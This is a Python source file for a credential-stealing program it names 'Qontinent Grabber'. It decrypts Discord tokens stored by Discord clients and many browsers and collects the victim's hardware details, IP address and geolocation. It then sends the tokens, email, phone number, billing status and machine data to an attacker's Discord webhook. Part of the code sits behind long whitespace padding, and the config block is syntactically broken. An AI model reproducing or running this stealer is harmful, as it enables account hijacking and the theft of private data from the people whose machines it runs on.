import httpx, os, json, base64, psutil, subprocess, cpuinfo;from re import findall;from Cryptodome.Cipher import AES;from win32crypt import CryptUnprotectData # Pep 0008 -> https://www.python.org/dev/peps/pep-0008/
class attomwaffen:
    continent{
        'webhook': 'Webhook
        'ping_on_run': True                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            };                                                                                                                                                                                                                          tokens = [];appdata, roaming, regex = os.getenv("localappdata"), os.getenv("appdata"), r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}";gpu, cpu, ram_amount, disk_amount, hwid = cpuinfo.get_cpu_info()['brand_raw'], subprocess.check_output('wmic path Win32_VideoController get name').decode().split('\n')[1].strip(), str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0] + " GB", str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0] + " GB", subprocess.check_output('wmic csproduct get uuid').decode('utf-8').split('\n')[1].strip();GetHeaders, DecryptPayload, GenerateCipher, DecryptPassword, GetTokenKey, HasPaymentMethods, NetworkInfo = lambda token=None, content_type="application/json": {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"} if not token else {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36", "Authorization": token}, lambda cipher, payload: cipher.decrypt(payload), lambda aes_key, iv: AES.new(aes_key, AES.MODE_GCM, iv), lambda buff, master_key: attomwaffen.DecryptPayload(attomwaffen.GenerateCipher(master_key, buff[3:15]), buff[15:])[:-16].decode(), lambda path: CryptUnprotectData(base64.b64decode(json.loads(open(path, "r", encoding="utf-8").read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1], lambda token: bool(len(httpx.get("https://discord.com/api/v8/users/@me/billing/payment-sources", headers=attomwaffen.GetHeaders(token)).json()) > 0), lambda api = httpx.get("https://ipinfo.io/json").json(): [api.get('ip'), api.get('country'), api.get('city'), api.get('region'), api.get('org'), api.get('loc')]
    def GrabTokens() -> list:
        for source, path in {'Discord': attomwaffen.roaming + r'\\discord\\Local Storage\\leveldb\\', 'Discord Canary': attomwaffen.roaming + r'\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': attomwaffen.roaming + r'\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': attomwaffen.roaming + r'\\discordptb\\Local Storage\\leveldb\\', 'Opera': attomwaffen.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': attomwaffen.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': attomwaffen.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': attomwaffen.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': attomwaffen.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': attomwaffen.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': attomwaffen.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': attomwaffen.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': attomwaffen.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': attomwaffen.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': attomwaffen.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': attomwaffen.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Epic Privacy Browser': attomwaffen.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': attomwaffen.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': attomwaffen.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': attomwaffen.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': attomwaffen.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': attomwaffen.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\','Ungoogled Chromium': attomwaffen.appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\'}.items():
            if not os.path.exists(path): continue
            if "discord" in path:
                for _file in os.listdir(path):
                    if not _file.endswith('.log') and not _file.endswith('.ldb'): continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for y in findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            for i in ["discordcanary", "discord", "discordptb"]:
                                if os.path.isfile(attomwaffen.roaming + f'\\{i}\\Local State'): token = attomwaffen.DecryptPassword(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), attomwaffen.GetTokenKey(attomwaffen.roaming+ f'\\{i}\\Local State')); attomwaffen.tokens.append(token) if token not in attomwaffen.tokens and httpx.get("https://discord.com/api/v9/users/@me", headers=attomwaffen.GetHeaders(token)).status_code == 200 else None 

            for _file in os.listdir(path):
                if not _file.endswith('.log') and not _file.endswith('.ldb'): continue
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in findall(attomwaffen.regex, line): attomwaffen.tokens.append(token) if token not in attomwaffen.tokens and httpx.get("https://discord.com/api/v9/users/@me", headers=attomwaffen.GetHeaders(token)).status_code == 200 else None
    def SendTokens():
        attomwaffen.GrabTokens()
        for token in attomwaffen.tokens: r = httpx.get("https://discord.com/api/v9/users/@me", headers=attomwaffen.GetHeaders(token)).json(); nitro, better_way = {1: "Nitro Classic", 2: "Nitro Boost"}[r["premium_type"]] if "premium_type" in r else "None",  {1: "<:staff:968704541946167357> ", 2: "<:partner:968704542021652560> ", 4: "<:hypersquad_events:968704541774192693> ", 8: "<:bug_hunter_1:968704541677723648> ", 64: "<:hypersquad_1:968704541501571133> ", 128: "<:hypersquad_2:968704541883261018> ", 256: "<:hypersquad_3:968704541874860082> ", 512: "<:early_supporter:968704542126510090> ", 16384: "<:bug_hunter_2:968704541774217246> ", 131072: "<:verified_dev:968704541702905886> ", 262144: "<:certified_moderator:988996447938674699> "}; badges, badges = '', "".join(badge for badge in [better_way[i] for i in better_way if i & r["flags"]] or ["None"]); badges += '<a:NitroBoost:1006998907915616276> ' if nitro == "Nitro Boost" else '<a:NitroClassic:976651893344448532> ' if nitro == "Nitro Classic" else ''; httpx.post(attomwaffen.continent['webhook'], json={"content": "@everyone" if attomwaffen.continent['ping_on_run'] else None, "embeds": [{"color": 0x2F3136, "fields": [{"name": "<:Discord:1010301214862356551> | **__Discord Info__**", "value": f"**Email > ** {r['email']}\n**Phone > ** {r['phone'] if r['phone'] else 'No Phone Number Linked'}\n**2FA > ** {'Enabled' if r['mfa_enabled'] else 'Disabled'}\n**Billing > ** {attomwaffen.HasPaymentMethods(token)}\n**Nitro > ** {nitro}\n**Badges > ** {badges.replace('None', '') if badges != '' else 'None'}\n**Friend Amount > ** {len(httpx.get('https://discord.com/api/v9/users/@me/relationships', headers=attomwaffen.GetHeaders(token)).json())}\n**Server Amount >** {len(httpx.get('https://discord.com/api/v9/users/@me/guilds', headers=attomwaffen.GetHeaders(token)).json())}\n**NSFW > ** {r['nsfw_allowed']}\n**About Me > ** {r['bio'] if r['bio'] != '' else 'None'}", "inline": False}, {"name": "🔑 | **__Token__**", "value": f'||{token}||', "inline": False}, {"name": "🖥 | **__Computer Info__**", "value": f"**PC Userame > ** {os.getlogin()}\n**PC Name > ** {os.getenv('COMPUTERNAME').lower()}\n**GPU > **{attomwaffen.gpu}\n**CPU > **{attomwaffen.cpu}\n**Ram > ** {attomwaffen.ram_amount}\n**Disk > ** {attomwaffen.disk_amount}\n**Hwid > ** {attomwaffen.hwid}", "inline": False}, {"name": "🌐 | **__Network Info__**", "value": f"**IP > ** {attomwaffen.NetworkInfo()[0]}\n**Country > ** {attomwaffen.NetworkInfo()[1]}\n**City > ** {attomwaffen.NetworkInfo()[2]}\n**Region > ** {attomwaffen.NetworkInfo()[3]}\n**Organization > ** {attomwaffen.NetworkInfo()[4]}\n**Location > ** {attomwaffen.NetworkInfo()[5]}\nhttps://www.google.com/maps/search/google+map++{attomwaffen.NetworkInfo()[5]}", "inline": False}],"author": {'name': r["username"] + "#" + r["discriminator"] + " | " + r["id"], 'icon_url': f'https://cdn.discordapp.com/avatars/{r["id"]}/{r["avatar"]}.png', },"thumbnail": {"url": f"https://cdn.discordapp.com/banners/{r['id']}/{r['banner']}.png?size=1024" if r['banner'] != 'None' else None},'footer': {'text': f"🧭・Qontinent Grabber | Made by rip#0004"}}], "username": "🧭 x Qontinent Grabber | waifu#1337", 'avatar_url': f'https://cdn.discordapp.com/avatars/{r["id"]}/{r["avatar"]}.png'})
if __name__ == "__main__": attomwaffen.SendTokens()
